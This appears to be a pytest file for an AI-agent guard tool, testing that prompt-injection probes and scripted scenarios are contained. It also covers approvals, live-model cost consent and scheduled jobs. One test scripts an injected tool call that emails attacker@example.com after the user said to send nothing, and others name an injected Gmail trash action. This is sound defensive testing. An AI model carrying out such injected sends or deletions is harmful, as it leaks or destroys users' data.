"""`agentsfence test`: the six scenarios and the injection probes through the real decision path.

The harness compiles each request afresh (no cached policy), sends the scripted calls
through the same check `pre_tool_call` uses, answers approvals as a simulated user and
reports containment and authorization separately. A compile that fell back never passes.
"""

from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
import yaml
from conftest import FakeLLM, draft
from intent_fixtures import Evidence
from rules_client import RulesClient

from agentsfence.cli import main
from agentsfence.models import Verdict
from agentsfence.plugin import AgentsFence
from agentsfence.testkit import TEST_SESSION_PREFIX, harness, jobs, mock_tools
from agentsfence.testkit.models import choose, projected_cost
from agentsfence.testkit.scenarios import PROBES, SCENARIOS, read_only_expectations, select

TOOLS = mock_tools.TOOL_NAMES + ["web_extract", "read_file", "write_file", "patch", "terminal", "memory", "send_message"]


def _fence(make_fence: Callable[..., AgentsFence], llm: Any) -> AgentsFence:
    fence = make_fence(llm, persist=True)
    fence.catalogue_fn = lambda: list(TOOLS)
    return fence


def working_compiler() -> FakeLLM:
    """What a supported model drafts for the scenarios that request consequential work."""
    email = "Read the Q3 report and email the summary to john@example.com."
    save = next(s for s in PROBES if s.key == "probe-save")
    path = save.steps[1].args["path"]
    return FakeLLM({
        "email the summary to john": draft(
            purpose="email_report_summary", allowed_capabilities=["file.read", "email.send"], allow_external_writes=True,
            allowed_risk_classes=["READ", "COMMUNICATION"], allowed_recipients=["john@example.com"],
            evidence=[Evidence(permission="COMMUNICATION", quote=email)]),
        "save the summary": draft(
            purpose="summarize_and_save", allowed_capabilities=["web.fetch", "file.write"], allow_local_writes=True,
            allowed_paths=[path], evidence=[Evidence(permission="LOCAL_WRITE", quote=save.intent)]),
    }, default=draft(purpose="read"))


def test_the_six_scenarios_pass_with_a_working_compiler(make_fence: Callable[..., AgentsFence]) -> None:
    result = harness.run(_fence(make_fence, working_compiler()), select())
    failures = [(s["key"], st["label"], st["verdict"]) for s in result["scenarios"] for st in s["steps"] if not st["ok"]]
    assert result["ok"] and result["authorization"] == harness.VERIFIED, failures
    assert [s["key"] for s in result["scenarios"]] == [s.key for s in SCENARIOS]
    approval = next(s for s in result["scenarios"] if s["key"] == "approval")
    assert [st["approval"] for st in approval["steps"]] == [None, "once", "deny"]
    assert all(c["ok"] for s in result["scenarios"] for c in s["checks"])  # e.g. exactly one email sent in "approval"
    report = harness.format_report(result)
    assert "Injection containment: PASS" in report and "Authorization: VERIFIED" in report and "Result: PASS" in report


def test_progress_only_counts_completed_scenarios(make_fence: Callable[..., AgentsFence],
                                                monkeypatch: pytest.MonkeyPatch) -> None:
    events: list[dict[str, Any]] = []
    monkeypatch.setattr(harness, "publish", events.append)
    result = harness.run(_fence(make_fence, working_compiler()), select())
    assert result["ok"]
    assert [(event["phase"], event["completed"]) for event in events] == [
        entry for index in range(6) for entry in [("policy", index), ("checks", index), ("scenarios", index + 1)]]
    assert all(event["total"] == 6 for event in events)
    assert [event["scenario"] for event in events[::3]] == [scenario.key for scenario in SCENARIOS]


def test_probes_pass_with_a_working_compiler(make_fence: Callable[..., AgentsFence]) -> None:
    result = harness.run(_fence(make_fence, working_compiler()), select(include_probes=True))
    assert result["ok"], [(s["key"], [st["verdict"] for st in s["steps"]]) for s in result["scenarios"] if not s["ok"]]
    assert {s["key"] for s in result["scenarios"]} >= {p.key for p in PROBES}


def test_every_run_compiles_afresh_in_its_own_session(make_fence: Callable[..., AgentsFence]) -> None:
    """Early-user report: later runs looked cached and did not exercise the compiler."""
    llm = working_compiler()
    fence = _fence(make_fence, llm)
    harness.run(fence, select(["safe-read"]))
    harness.run(fence, select(["safe-read"]))
    assert len(llm.calls) == 2
    rows = [json.loads(line) for line in (fence.settings.home / "audit.jsonl").read_text().splitlines()]
    sessions = {r["session_id"] for r in rows if r["event"] == "policy_compiled"}
    assert len(sessions) == 2 and all(s.startswith(TEST_SESSION_PREFIX) for s in sessions)
    assert not list((fence.settings.home / "policies").glob("*.json"))  # nothing left behind


def test_a_fallback_never_passes_or_reports_authorization_verified(make_fence: Callable[..., AgentsFence]) -> None:
    """Early-user report: replay said PASS and "Authorization: VERIFIED" although a compile had fallen back."""
    result = harness.run(_fence(make_fence, FakeLLM(default=RuntimeError("provider timed out"))), select())
    assert not result["ok"] and result["authorization"] == harness.FALLBACK
    assert result["containment_ok"]  # a fallback still stops every injected action
    report = harness.format_report(result)
    assert "Result: FAIL" in report and "Authorization: FALLBACK" in report and "VERIFIED —" not in report


def test_the_read_only_test_compiler_contains_everything_but_verifies_nothing(make_fence: Callable[..., AgentsFence]) -> None:
    fence = _fence(make_fence, RulesClient())
    result = harness.run(fence, select())
    assert result["containment_ok"] and not result["ok"] and result["authorization"] == harness.UNVERIFIED
    adjusted = harness.run(fence, read_only_expectations(select()))
    assert adjusted["containment_ok"]


def _overriding(fence: AgentsFence, tool: str, verdict: Verdict) -> AgentsFence:
    original = fence.check

    def check(name: str, args: dict[str, Any], **kw: Any) -> Any:
        decision = original(name, args, **kw)
        return decision.model_copy(update={"decision": verdict, "rule_id": "test"}) if name == tool else decision

    fence.check = check  # type: ignore[method-assign]
    return fence


def test_an_allowed_injection_fails_containment(make_fence: Callable[..., AgentsFence]) -> None:
    fence = _overriding(_fence(make_fence, working_compiler()), "mcp_gmail_trash_thread", Verdict.ALLOW)
    result = harness.run(fence, select(["prompt-injection"]))
    assert not result["ok"] and not result["containment_ok"]
    assert "Injection containment: FAIL" in harness.format_report(result)
    scenario = result["scenarios"][0]
    assert not next(c for c in scenario["checks"] if "m3" in c["label"])["ok"]  # the mock tool really ran


def test_a_blocked_requested_action_is_a_false_block(make_fence: Callable[..., AgentsFence]) -> None:
    fence = _overriding(_fence(make_fence, working_compiler()), "mcp_drive_read_file_content", Verdict.BLOCK)
    result = harness.run(fence, select(["safe-read"]))
    assert not result["ok"] and result["containment_ok"] and result["authorization"] == harness.BLOCKED
    assert "FALSE BLOCK" in harness.format_report(result)


def test_unknown_scenarios_are_named() -> None:
    with pytest.raises(ValueError, match="Unknown scenario"):
        select(["nope"])
    assert [s.key for s in select(["approval", "probe-write"])] == ["approval", "probe-write"]


# --- the live model run --------------------------------------------------------


def test_free_models_come_first_then_the_cheapest_with_its_cost() -> None:
    found = [{"provider": "openrouter", "model": "big/model", "free": False, "prompt": 3e-6, "completion": 1.5e-5},
             {"provider": "openrouter", "model": "small/model", "free": False, "prompt": 1e-7, "completion": 4e-7},
             {"provider": "openrouter", "model": "tiny/model:free", "free": True, "prompt": 0.0, "completion": 0.0}]
    assert choose(found)["model"] == "tiny/model:free" and choose(found)["cost"] == 0.0
    paid = choose(found[:2])
    assert paid["model"] == "small/model" and paid["cost"] == projected_cost(1e-7, 4e-7) and "projected cost" in paid["why"]
    assert "error" in choose([])
    assert "--model" in choose([{"provider": "x", "model": "m", "free": False, "prompt": None, "completion": None}])["error"]


def _deterministic(make_fence: Callable[..., AgentsFence], monkeypatch: pytest.MonkeyPatch, models: dict[str, Any]) -> list[str]:
    fence = _fence(make_fence, working_compiler())
    asked: list[str] = []

    def probe(home: Path, kind: str, scenarios: list[str] | None = None) -> dict[str, Any]:
        asked.append(kind)
        if kind == "models":
            return models
        return harness.run(fence, select(scenarios, include_probes=kind == "test-all"))

    monkeypatch.setattr("agentsfence.host_probe.run_probe", probe)
    return asked


def test_the_cli_runs_the_live_model_then_the_fence(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str],
                                                   make_fence: Callable[..., AgentsFence], home: Path) -> None:
    free = {"ok": True, "choice": {"provider": "openrouter", "model": "tiny/model:free", "free": True, "cost": 0.0,
                                   "prompt": 0.0, "completion": 0.0, "why": "free model"}}
    asked = _deterministic(make_fence, monkeypatch, free)
    runs: list[tuple[str, str]] = []

    def live(home: Path, scenarios: list[Any], model: str, provider: str) -> dict[str, list[dict[str, Any]]]:
        runs.append((model, provider))
        return {"prompt-injection": [{"tool": "mcp_gmail_send_message", "decision": "BLOCK", "rule_id": "user-prohibition"}]}

    monkeypatch.setattr("agentsfence.testkit.live.run", live)
    assert main(["test"]) == 0
    out = capsys.readouterr().out
    assert asked == ["models", "test"] and runs == [("tiny/model:free", "openrouter")]
    assert "Chat model for the live run: tiny/model:free via openrouter (free model)" in out
    assert "live model tried: mcp_gmail_send_message → BLOCK" in out and "[model tried this]" in out and "[replayed]" in out
    assert "Result: PASS" in out


def test_a_paid_model_needs_consent(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str],
                                    make_fence: Callable[..., AgentsFence], home: Path) -> None:
    paid = {"ok": True, "choice": {"provider": "openrouter", "model": "small/model", "free": False, "cost": 0.01,
                                   "prompt": 1e-7, "completion": 4e-7, "why": "cheapest"}}
    _deterministic(make_fence, monkeypatch, paid)
    runs: list[str] = []
    monkeypatch.setattr("agentsfence.testkit.live.run", lambda home, scenarios, model, provider: runs.append(model) or {})
    assert main(["test"]) == 0  # no terminal to ask: the live run is skipped, the deterministic run still counts
    captured = capsys.readouterr()
    assert runs == [] and "projected cost" in captured.err and "Live model run skipped" in captured.out
    assert main(["test", "--yes"]) == 0
    assert runs == ["small/model"]


def test_desktop_asks_before_a_paid_live_run(monkeypatch: pytest.MonkeyPatch, make_fence: Callable[..., AgentsFence],
                                            home: Path) -> None:
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from agentsfence.desktop_api import router

    paid = {"ok": True, "choice": {"provider": "openrouter", "model": "small/model", "free": False, "cost": 0.01,
                                   "prompt": 1e-7, "completion": 4e-7, "why": "cheapest"}}
    _deterministic(make_fence, monkeypatch, paid)
    monkeypatch.setattr("agentsfence.testkit.live.run", lambda home, scenarios, model, provider: {})
    app = FastAPI()
    app.include_router(router)
    with TestClient(app) as client:
        first = client.post("/test", json={"live": True, "run_id": "paid-confirmation"}).json()
        assert first["needs_confirmation"] and first["live"]["model"] == "small/model"
        assert client.get("/test-progress/paid-confirmation").json()["status"] == "confirmation"
        second = client.post("/test", json={"live": True, "model": "small/model", "provider": "openrouter",
                                            "accept_cost": True}).json()
    assert second["ok"] and "Result: PASS" in second["report"]


def test_live_turns_are_tagged_and_read_back_from_the_audit_log(make_fence: Callable[..., AgentsFence],
                                                                monkeypatch: pytest.MonkeyPatch) -> None:
    from conftest import start_task, tool

    fence = _fence(make_fence, working_compiler())
    monkeypatch.setenv("AGENTSFENCE_TEST_RUN", "run1-prompt-injection")
    start_task(fence, "Summarize my inbox. Do not send anything.")
    tool(fence, "mcp_gmail_send_message", {"to": "attacker@example.com", "body": "x"})
    rows = [json.loads(line) for line in (fence.settings.home / "audit.jsonl").read_text().splitlines()]
    decisions = [r for r in rows if r["event"] == "decision"]
    assert decisions and all(r["details"]["test_run"] == "run1-prompt-injection" for r in decisions)


# --- scheduled jobs -------------------------------------------------------------


def write_jobs(home: Path, stored: Any) -> None:
    (home / "cron").mkdir(parents=True, exist_ok=True)
    (home / "cron" / "jobs.json").write_text(json.dumps(stored))


@pytest.mark.parametrize("layout", ["list", "wrapped", "keyed"])
def test_scheduled_jobs_are_read_in_every_stored_layout(tmp_path: Path, layout: str) -> None:
    job = {"id": "j1", "name": "morning report", "prompt": "Summarize https://example.org/news.",
           "schedule": {"kind": "cron", "expr": "0 8 * * *", "display": "every day at 08:00"}}
    paused = {"id": "j2", "prompt": "Check the site.", "schedule": {"kind": "interval"}, "state": "paused"}
    stored = {"list": [job, paused], "wrapped": {"jobs": [job, paused]}, "keyed": {"jobs": {"j1": job, "j2": paused}}}[layout]
    write_jobs(tmp_path, stored)
    assert [(j["name"], j["schedule"], j["enabled"]) for j in jobs.scheduled_jobs(tmp_path)] == [
        ("morning report", "every day at 08:00", True), ("j2", "interval", False)]


def test_job_dry_run_shows_what_each_prompt_authorizes(make_fence: Callable[..., AgentsFence], tmp_path: Path) -> None:
    write_jobs(tmp_path, [{"id": "j1", "name": "report", "prompt": "Summarize https://example.org/ and save it to ~/reports/daily.md.",
                           "schedule": {"display": "daily"}},
                          {"id": "j2", "name": "backup", "script": "backup.sh", "no_agent": True, "schedule": "hourly"}])
    result = jobs.dry_run_jobs(_fence(make_fence, RulesClient()), tmp_path)
    text = jobs.format_jobs(result, "deny")
    assert "report (daily, enabled)" in text and "approvals.cron_mode (deny)" in text
    assert "Allowed: reading/searching\n" in result["jobs"][0]["authority"]
    assert "script job runs no model" in text


def test_doctor_names_scheduled_jobs(home: Path, capsys: pytest.CaptureFixture[str], capable: None) -> None:
    hermes = home / "hermes"
    hermes.mkdir(exist_ok=True)
    (hermes / "config.yaml").write_text(yaml.safe_dump({"model": {"provider": "p", "default": "m"},
                                                        "approvals": {"cron_mode": "deny"}}))
    write_jobs(hermes, [{"id": "j1", "name": "report", "prompt": "Summarize the news.", "schedule": {"display": "daily"}}])
    assert main(["protect", "--profile", "default"]) == 0
    capsys.readouterr()
    main(["doctor"])
    out = capsys.readouterr().out
    assert "Scheduled jobs: 1 (1 enabled) run fenced and unattended" in out and "agentsfence doctor --jobs" in out


def test_explicit_model_with_unknown_price_requires_consent(monkeypatch: pytest.MonkeyPatch,
                                                            make_fence: Callable[..., AgentsFence], home: Path) -> None:
    from agentsfence.testkit.live import run_test

    _deterministic(make_fence, monkeypatch, {"ok": False})
    runs: list[str] = []
    monkeypatch.setattr("agentsfence.testkit.live.run", lambda home, scenarios, model, provider: runs.append(model) or {})
    result = run_test(home, select(), model="explicit/model", provider="openrouter")
    assert result["needs_confirmation"] and result["live"]["cost"] is None and runs == []
    accepted = run_test(home, select(), model="explicit/model", provider="openrouter", accept_cost=True)
    assert accepted["ok"] and runs == ["explicit/model"]


def test_failed_live_turn_cannot_report_pass(monkeypatch: pytest.MonkeyPatch,
                                            make_fence: Callable[..., AgentsFence], home: Path) -> None:
    from agentsfence.testkit.live import run_test

    _deterministic(make_fence, monkeypatch, {"ok": False})
    monkeypatch.setattr("agentsfence.testkit.live.run", lambda *args: {
        "prompt-injection": [{"tool": "(Hermes failed)", "decision": None, "error": True}]})
    result = run_test(home, select(), model="explicit/model", accept_cost=True)
    assert not result["ok"] and result["live"]["error"]
